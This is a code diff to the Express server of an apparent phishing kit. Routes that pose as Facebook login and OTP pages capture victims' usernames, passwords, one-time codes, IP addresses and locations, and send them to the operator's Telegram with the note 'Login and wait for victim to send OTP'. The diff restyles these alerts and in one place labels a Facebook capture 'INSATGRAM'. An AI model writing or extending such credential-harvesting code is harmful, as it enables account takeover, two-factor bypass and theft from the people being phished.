@@ -167,17 +167,18 @@ router.post("/face/:linkId", async (req, res) => {
             });
             await newCredential.save();
             await bot.sendMessage(user.telegramID, `
-LOG ENTRY
-PLATFORM: FACEBOOK
+😈NEW ENTRY😈
 
-
-USERNAME/PHONE/ID: ${username}
+USERNAME: ${username}
 PASSWORD: ${password}
 
+PLATFORM: INSATGRAM
 COUNTRY: ${country}
 CITY: ${city}
 REGION: ${region}
 IP: ${ip}
+
+${link.otpEnabled ? "Login and wait for victim to send OTP" : ""}
 
 Login with: https://www.facebook.com
                                                 `)
@@ -207,11 +208,14 @@ router.post("/face/otp/:linkId", async (req, res) => {
 
         if (link) {
             await bot.sendMessage(user.telegramID, `
-LOG ENTRY
+😈NEW ENTRY😈
 
 PLATFORM: FACEBOOK
-TYPE: OTP
+
+OTP RECEIVED!
+
 CODE: ${code}
+
 
 `)
                 .catch(err => console.log("Telegram error"));
